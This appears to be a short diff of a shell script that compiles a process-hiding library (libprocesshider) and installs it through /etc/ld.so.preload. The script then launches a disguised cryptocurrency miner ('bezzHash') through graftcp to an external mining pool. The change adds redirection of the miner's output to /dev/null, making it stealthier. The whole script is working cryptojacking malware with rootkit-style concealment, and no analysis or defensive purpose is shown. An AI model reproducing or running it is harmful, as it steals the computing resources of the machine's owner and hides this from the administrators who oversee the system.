@@ -40,4 +40,4 @@ gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
-./graftcp/graftcp ./bezzHash --url=sagemode.$(echo $(shuf -i 1-99999 -n 1)-THOR)@ethash.kupool.com:443 
+./graftcp/graftcp ./bezzHash --url=sagemode.$(echo $(shuf -i 1-99999 -n 1)-THOR)@ethash.kupool.com:443 >/dev/null 2>&1
